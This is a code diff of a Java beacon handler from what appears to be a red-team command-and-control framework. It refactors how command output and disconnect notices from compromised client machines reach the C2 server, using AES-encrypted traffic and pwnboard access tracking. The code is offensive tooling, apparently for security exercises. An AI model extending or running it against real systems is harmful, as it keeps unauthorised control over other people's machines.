@@ -15,14 +15,14 @@ public class BeaconClientHandler implements Runnable{
     // IP address of the client
     private String IPAddress;
 
+    // Operating System of the client
+    private String OS;
+
     // Pointer to the duplexer that is used to send/receive with client
     private Duplexer duplexer;
 
     // Pointer back to the Beacon Server that is associated with this client
     private BeaconServer beaconServer;
-
-    // Operating System of the client
-    private String os;
 
     // Sentinel = true when this client is still active, when the client connection is lost Sentinel = false
     private Boolean sentinel = true;
@@ -34,12 +34,6 @@ public class BeaconClientHandler implements Runnable{
     // Object lock used to make sure that this thread is able to safetly access the duplexer
     private Object sendLock;
 
-    // Boolean to determine whether or not this client is currently in a shell, or commands are just being distributed to many clients
-    private Boolean isShell = false;
-
-    // Object Lock used for notifying when messages have been received when the client is currently being used as a shell
-    private Object shellLock;
-
     // Variables used to send HTTP Requests to pwnboard. pwnboard is used to keep track of what machines red team still has access to.
     private URI pwnboardUri = null;
     private URL pwnboardUrl = null;
@@ -47,9 +41,6 @@ public class BeaconClientHandler implements Runnable{
     private String pwnboardData;
     private Object pwnBoardLock;
     private pwnBoardRequest pwnBoardRequestObject;
-
-    // Class used to do rot13 encryption
-    //private rot13 rot13;
 
     // Class used to do aes encryption
     private aes aes;
@@ -62,15 +53,14 @@ public class BeaconClientHandler implements Runnable{
      * @param beaconServer Pointer to the Becon Server that this client is associated with
      * @param os Operating System of this client
      */
-    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os, Object shellLock, aes aes){
+    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String OS, Object shellLock, aes aes){
         this.IPAddress = IPAddress;
         this.duplexer = duplexer;
         this.beaconServer = beaconServer;
-        this.os = os;
+        this.OS = OS;
         this.sendLock = new Object();
         this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, false, aes);
         this.keepAliveThread = new Thread(keepAliveClass);
-        this.shellLock = shellLock;
         this.aes = aes;
 
         try{
@@ -92,10 +82,6 @@ public class BeaconClientHandler implements Runnable{
         duplexer.close();
     }
 
-    protected void setIsShell(Boolean value){
-        this.isShell = value;
-    }
-
     /**
      * Use this function to have the thread send a message to the client
      * 
@@ -103,9 +89,6 @@ public class BeaconClientHandler implements Runnable{
      */
     protected void sendToClient(String message){
         if(sentinel){
-            //message = rot13.encrypt(message);
-            //String httpHeader = "HTTP/1.1 200 OK\r\n" +  "Content-Length: " + message.length() + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
-            //message = httpHeader + message;
             synchronized(sendLock){
                 duplexer.send(aes.encrypt(message), true);
             }
@@ -127,12 +110,27 @@ public class BeaconClientHandler implements Runnable{
         } catch (IOException d){
             d.printStackTrace();
         }
-        beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
-        beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
+        sendResponseToC2("client_disconnect", "Lost " + OS + " Client");
         System.out.println(IPAddress + " disconnected");
         if(e != null){
             e.printStackTrace();
         }
+    }
+
+    /**
+     * Function used to send messages to the C2 Server
+     * IP address: is the IP Address of the client
+     * Type can be one of the following fields
+     *  - client_command_response: Data contains the output from running a command
+     *  - client_disconnect: A client has disconnected from the C2 Server
+     *  - client_connect: The Beacon Server has received a new client
+     * 
+     * @param type - type of message
+     * @param data - data of message
+     */
+    private void sendResponseToC2(String type, String data){
+        String message = "{\"ip\": \"" + IPAddress + "\", \"type\": \"" + type + "\", \"data\": \"" + data + "\"}";
+        beaconServer.sendDataToC2Server(message);
     }
 
     @Override
@@ -166,18 +164,9 @@ public class BeaconClientHandler implements Runnable{
                     pwnBoardLock.notify();
                 }
 
-
-                
+                // Send client response back to C2
                 if(!(response.equals("KEEP_ALIVE"))){
-                    beaconServer.addDataToResponsesDictionaries(IPAddress, response);
-
-                    // If this client is currently being used as a shell, notify the lock so that the server knows
-                    // to return the responses immediately
-                    if(isShell){
-                        synchronized(shellLock){
-                            shellLock.notify();
-                        }
-                    }
+                    sendResponseToC2("client_command_response", response);
                 }
             } catch(java.net.SocketException e){
                 clientDisconnect(e);
